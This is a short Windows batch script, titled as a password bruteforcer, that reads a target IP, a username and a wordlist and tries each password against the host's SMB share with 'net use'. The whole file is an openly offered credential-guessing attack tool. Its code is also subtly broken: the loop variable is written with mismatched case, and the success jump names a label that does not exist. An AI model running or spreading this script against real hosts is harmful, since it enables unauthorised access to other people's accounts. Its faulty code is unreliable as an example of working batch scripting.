@echo off
title Password Bruteforce - By Bolibomba
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter User: "
set /p wordlist="Enter Password List:"


for /f %%a in (%wordlist%) do (
set pass=%%A
call :attempt
)
echo Password not found
pause
exit
:success
echo Password Found : %pass%
pause
exit
:attempt
net use \\%ip% /user:%user% %pass%
echo attempt: %pass%
if %errorlevel% EQU 0 goto succes
